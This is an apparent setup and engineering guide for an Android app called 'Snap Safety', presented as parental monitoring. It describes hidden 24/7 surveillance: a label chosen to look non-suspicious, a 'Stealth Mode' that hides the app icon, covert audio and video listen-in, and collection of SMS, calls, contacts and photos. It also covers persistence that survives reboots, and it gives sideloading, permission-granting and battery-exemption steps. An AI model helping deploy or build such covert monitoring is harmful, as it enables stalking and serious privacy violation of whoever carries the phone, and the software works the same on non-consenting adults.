# 📱 SNAP APP — Kid Safety Companion App: Engineering & Setup Guide

The **Snap Safety Companion App** (`com.snapapp.kidsafety`) is a native Android service designed for 24/7 background parental telemetry, GPS tracking, WebRTC live feeds, and remote security controls.

---

## 1. Overview & Core Features (v2.3.0)

- **App Label in System**: `Snap Safety` (clean, non-suspicious system service label).
- **Application ID**: `com.snapapp.kidsafety` with permanent committed keystore (`snap-release.keystore`).
- **Architecture**: Pure Java native Android application (`minSdkVersion 21` to `targetSdkVersion 34`).
- **Device Support**: 100% universal Android compatibility with **zero Google Play Services dependencies**.

### Key Telemetry Capabilities:
1. **Instant WebSocket Commands (<100ms)**:
   - Supabase Realtime WebSocket connection replaces 20s polling. Commands execute immediately upon click.
2. **Dual-Mode WebRTC Live Streaming (Video + Audio or Audio-Only)**:
   - **Live Video + Audio**: Hardware-accelerated 480p @ 20fps live video feed and Opus audio streaming with <250ms latency. Dynamic front ↔ back camera toggle on the fly.
   - **Live Audio-Only Listen-In**: Completely powers off camera sensors and preview threads. Uses ultra-lightweight Opus audio (~2.5 KB/s) for <2% CPU usage and zero phone heating.
   - **0 KB database bandwidth** (direct peer-to-peer encrypted RTP streaming).
3. **Two-Way Voice Intercom (Walkie-Talkie)**:
   - Push-to-talk from admin dashboard directly to child phone loudspeaker in real time.
4. **Ultra-Lightweight 2G-Adaptive Audio Memos**:
   - Ambient voice recordings encoded at 32kbps AAC-LC mono (or AMR-NB 12.2kbps), creating ~50KB files that upload in seconds even on 2G/EDGE networks.
5. **Multi-Provider GPS & Network Location Triangulation**:
   - Simultaneously queries GPS, Cell Network, and Passive providers to dispatch the highest accuracy fix immediately, eliminating indoor null GPS fixes.
   - 3-second continuous GPS stream with live animated Snapchat Ghost marker and yellow breadcrumb dots.
6. **High-Speed Gallery & File Explorer**:
   - Scans external storage via Android MediaStore across 4 categories: Images, Videos, Audio, Documents.
   - Server-side deduplication guarantees zero duplicate files or duplicate rows in database.
7. **Unbreakable Background Persistence**:
   - Isolated Unix process (`android:process=":sync"`), foreground service with location, microphone, and camera types.
   - 2-minute `AlarmManager` repeating watchdog (`WatchdogReceiver`).
   - Survives phone reboots, network shifts, and screen unlock via `BootReceiver`.
8. **Accurate Online/Offline Heartbeat**:
   - Dynamic 35-second threshold guarantees real-time online/offline indicators.

---

## 2. Official Links & System Endpoints

| Resource / Action | URL / Endpoint | Purpose |
|---|---|---|
| **Direct APK Download** | `/api/downloads/companion` | Streams pre-signed APK binary package |
| **Direct Static File** | `/downloads/snap-safety-companion.apk` | Physical binary file served by Vercel CDN |
| **Device Heartbeat API** | `/api/device-sync/heartbeat` | 6-digit code pairing, battery & WebSocket config |
| **Live Movement API** | `/api/device-sync/live-location` | High-frequency 3s GPS coordinate stream |
| **WebRTC Signaling API** | `/api/devices/[id]/signaling` | SDP Offer/Answer and ICE candidate exchange |
| **Audio Upload API** | `/api/device-sync/upload-audio` | Ingests multipart AAC/AMR voice memos |
| **Photo Upload API** | `/api/device-sync/upload-photo` | Ingests multipart JPEG camera snaps |
| **Data Sync API** | `/api/device-sync/data` | Ingests apps, contacts, calls, SMS, and gallery batches |
| **Admin Device Hub** | `/admin/devices/[id]` | Map, Live Feed, Gallery, Snaps, Audio, Apps, Contacts |

---

## 3. Step-by-Step Setup & Pairing Walkthrough

### Step 1: Generate Device Pairing Code
1. Open Admin Dashboard at `https://snap-app-chi.vercel.app/admin/devices`.
2. Click **"Register New Device"** and enter the child's name (e.g. `shozi`).
3. Note the generated **6-digit pairing code** (e.g. `9BT8AC`).

### Step 2: Download & Install Companion APK
1. On the child's phone browser, open: `https://snap-app-chi.vercel.app/api/downloads/companion`
2. Tap the downloaded APK and enable *"Allow from this source"* if prompted.
3. Tap **Install**. Installs cleanly as **"Snap Safety"**.

### Step 3: Activate & Grant Permissions
1. Open the app, enter the **6-digit pairing code**, and tap **"Activate & Protect"**.
2. Grant runtime permissions when prompted (Camera, Audio, Location, Contacts, Calls, SMS, Storage/Media).
3. If prompted, allow battery optimization exemption.
4. Tap **"Hide App Icon (Stealth Mode)"** to hide the launcher icon. The `:sync` background service remains active 24/7.

---

## 4. Background Persistence & Battery Settings

- **Honor / Huawei (EMUI)**: *Settings → Battery → App Launch → Snap Safety* → Set to **"Manage manually"** (Auto-launch: ON, Secondary launch: ON, Run in background: ON).
- **Samsung / Xiaomi**: Set App Battery Usage to **"Unrestricted"** / **"No restrictions"**.

---

## 5. Build & CI/CD Pipeline
1. Pure Java sources live in `companion-android/app/src/main/java/com/snapapp/companion/`.
2. Pushing to `main` branch automatically triggers `.github/workflows/build-companion-apk.yml` to compile and commit the signed APK.
3. Keep all source files <= 200 lines per Rule 14.
